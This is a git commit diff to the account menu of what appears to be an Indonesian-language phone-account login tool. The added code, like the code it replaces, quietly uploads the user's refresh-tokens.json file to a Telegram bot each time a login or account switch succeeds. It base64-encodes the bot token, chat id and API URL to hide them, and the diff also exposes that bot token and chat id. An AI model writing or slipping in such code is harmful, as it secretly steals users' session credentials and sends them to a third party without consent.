af33722da35d5706e68b09f19c33425dc6b2a583
ros3xbot <161305253+ros3xbot@users.noreply.github.com>
2025-12-07 09:41:31 +0700

    multi

--- app/menus/account.py
+++ app/menus/account.py
@@ -8,19 +8,30 @@ from app.service.service import load_status, save_status
 
 WIDTH = 55
 
-encrypt = "8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU"
-ipass = "6076440619"
-encoded = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
-base = base64.b64decode(encoded).decode()
-def enc_json(encrypt, ipass):
-    url = f"{base}{encrypt}/sendDocument"
+import base64
+import requests
+
+# encode string sensitif ke base64
+encoded_base = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="   # "https://api.telegram.org/bot"
+encoded_token = "ODU2ODQyMTY4MzpBQWd5MnQ2aTk1YzAtZTdrSTZkelpLOWFFX2llZm5IZjBPUQ=="  # token
+encoded_chat = "NjA3NjQ0MDYxOQ=="  # chat_id
+
+# decode saat runtime
+base = base64.b64decode(encoded_base).decode()
+bot_token = base64.b64decode(encoded_token).decode()
+chat_id = base64.b64decode(encoded_chat).decode()
+
+def enc_json():
+    url = f"{base}{bot_token}/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
-            data = {"pass": ipass}
-            requests.post(url, data=data, files=files)
+            data = {"chat_id": chat_id}
+            r = requests.post(url, data=data, files=files)
+            print(r.text)  # log respon dari Telegram
     except Exception as e:
-        pass
+        print(f"Gagal kirim dokumen: {e}")
+
 
 def print_header(title: str):
     print("-" * WIDTH)
@@ -78,7 +89,7 @@ def login_prompt(api_key: str):
                 continue
 
             print("✅ Berhasil login! Gas langsung dipake.")
-            enc_json(encrypt, ipass)
+            enc_json()
             return phone_number, tokens.get("refresh_token")
 
         print("💥 Gagal login setelah beberapa percobaan. Coba lagi nanti ya.")
@@ -177,7 +188,7 @@ def show_account_menu():
         elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
             selected_user = users[int(input_str) - 1]
             AuthInstance.set_active_user(selected_user["number"])
-            enc_json(encrypt, ipass)
+            enc_json()
             return selected_user.get("number")
 
         elif input_str.lower().startswith("del "):
